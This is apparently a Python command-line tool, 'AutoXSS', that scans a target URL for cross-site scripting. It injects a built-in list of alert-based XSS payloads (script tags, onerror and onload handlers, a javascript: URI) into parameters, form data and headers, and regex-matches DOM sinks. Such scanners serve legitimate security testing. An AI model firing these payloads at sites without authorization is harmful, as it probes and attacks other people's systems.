import argparse
import json
import csv
import re
import time
from urllib.parse import urlparse, parse_qs
from bs4 import BeautifulSoup
import requests

class AutoXSS:
    def __init__(self, target_url, method, params=None, data=None, headers=None, cookies=None, proxy=None):
        self.target_url = target_url
        self.method = method.upper()
        self.params = self.parse_input(params)
        self.data = self.parse_input(data)
        self.headers = self.parse_input(headers) or {}
        self.cookies = self.parse_input(cookies) or {}
        self.proxies = {"http": proxy, "https": proxy} if proxy else None
        self.session = requests.Session()
        self.vulnerabilities = []
        
        self.payloads = [
            '<script>alert("XSS")</script>',
            '<img src=x onerror=alert("XSS")>',
            '<svg/onload=alert("XSS")>',
            '\'"--></style></script><script>alert("XSS")</script>',
            'javascript:alert("XSS")'
        ]
        
        self.dom_patterns = [
            r'document\.write\(.*?\)',
            r'eval\(.*?\)',
            r'innerHTML\s*='
        ]

    def parse_input(self, input_str):
        if not input_str:
            return {}
        return dict(pair.split('=') for pair in input_str.split('&'))

    def load_custom_payloads(self, file_path):
        try:
            with open(file_path, 'r') as f:
                self.payloads.extend([line.strip() for line in f])
        except Exception as e:
            print(f"Error loading payloads: {e}")

    def check_reflected_xss(self, response, payload):
        return payload in response.text

    def check_dom_xss(self, response):
        dom_vulns = []
        scripts = BeautifulSoup(response.text, 'html.parser').find_all('script')
        for script in scripts:
            for pattern in self.dom_patterns:
                if re.search(pattern, script.string or ''):
                    dom_vulns.append({
                        'type': 'DOM-based XSS',
                        'evidence': script.string,
                        'pattern': pattern
                    })
        return dom_vulns

    def scan(self):
        injection_points = {
            'parameters': self.params,
            'data': self.data,
            'headers': self.headers
        }

        for point_type, points in injection_points.items():
            for field, value in points.items():
                for payload in self.payloads:
                    try:
                        test_params = self.params.copy()
                        test_data = self.data.copy()
                        test_headers = self.headers.copy()

                        if point_type == 'parameters':
                            test_params[field] = payload
                        elif point_type == 'data':
                            test_data[field] = payload
                        elif point_type == 'headers':
                            test_headers[field] = payload

                        response = self.session.request(
                            method=self.method,
                            url=self.target_url,
                            params=test_params,
                            data=test_data,
                            headers=test_headers,
                            cookies=self.cookies,
                            proxies=self.proxies,
                            timeout=10
                        )

                        if self.check_reflected_xss(response, payload):
                            self.log_vulnerability(
                                vuln_type="Reflected XSS",
                                location=point_type,
                                field=field,
                                payload=payload
                            )

                        dom_vulns = self.check_dom_xss(response)
                        if dom_vulns:
                            self.vulnerabilities.extend(dom_vulns)

                    except Exception as e:
                        print(f"Error testing {field}: {e}")

        return self.vulnerabilities

    def log_vulnerability(self, vuln_type, location, field, payload):
        self.vulnerabilities.append({
            'type': vuln_type,
            'location': location,
            'field': field,
            'payload': payload,
            'timestamp': time.strftime("%Y-%m-%d %H:%M:%S")
        })

    def generate_report(self, format='both'):
        if format in ('json', 'both'):
            with open('report.json', 'w') as f:
                json.dump(self.vulnerabilities, f, indent=2)
        if format in ('csv', 'both'):
            with open('report.csv', 'w', newline='') as f:
                writer = csv.DictWriter(f, fieldnames=self.vulnerabilities[0].keys())
                writer.writeheader()
                writer.writerows(self.vulnerabilities)

    def console_output(self):
        print(f"\n[+] Scan Results for {self.target_url}")
        print(f"Total vulnerabilities found: {len(self.vulnerabilities)}\n")
        for vuln in self.vulnerabilities:
            print(f"Type: {vuln['type']}")
            print(f"Location: {vuln['location']} > {vuln['field']}")
            print(f"Payload: {vuln['payload']}\n")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="AutoXSS - Automated XSS Vulnerability Scanner")
    parser.add_argument("--url", required=True, help="Target URL")
    parser.add_argument("--method", default="GET", choices=["GET", "POST"], help="HTTP method")
    parser.add_argument("--params", help="Request parameters (key=value&key2=value2)")
    parser.add_argument("--data", help="POST data (key=value&key2=value2)")
    parser.add_argument("--headers", help="Custom headers (Header=Value&Header2=Value2)")
    parser.add_argument("--cookie", help="Session cookies (key=value&key2=value2)")
    parser.add_argument("--proxy", help="Proxy server (http://proxy:port)")
    parser.add_argument("--payloads", help="Custom payloads file path")
    args = parser.parse_args()

    scanner = AutoXSS(
        target_url=args.url,
        method=args.method,
        params=args.params,
        data=args.data,
        headers=args.headers,
        cookies=args.cookie,
        proxy=args.proxy
    )

    if args.payloads:
        scanner.load_custom_payloads(args.payloads)

    vulnerabilities = scanner.scan()
    scanner.console_output()
    scanner.generate_report()
